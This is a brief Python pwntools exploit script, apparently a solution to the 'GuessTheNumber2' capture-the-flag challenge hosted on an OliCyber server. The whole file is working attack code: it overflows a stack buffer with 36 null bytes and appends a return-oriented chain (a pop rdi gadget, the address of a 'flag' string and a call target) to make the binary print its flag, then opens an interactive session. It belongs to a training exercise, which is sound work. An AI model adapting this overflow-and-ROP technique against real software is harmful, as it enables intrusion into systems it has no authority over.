from pwn import *
elf = context.binary = ELF('./GuessTheNumber2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if args.REMOTE:
    p = remote('gtn2.challs.olicyber.it', 10023)
elif args.GDB:
    p = gdb.debug([elf.path],'''
    b main
    c
    ''')
else:
    p = process([elf.path])



buff = 36


p.recvline()
p.recvline()

flag_addr = elf.search(b'flag').__next__()

chain = flat([
    0x0000000000401803,# pop rdi; ret; 
    flag_addr         ,  
    0x401608          ,
])


p.sendline(b'\x00'*36 + chain)
p.sendline(b'1')
p.interactive()

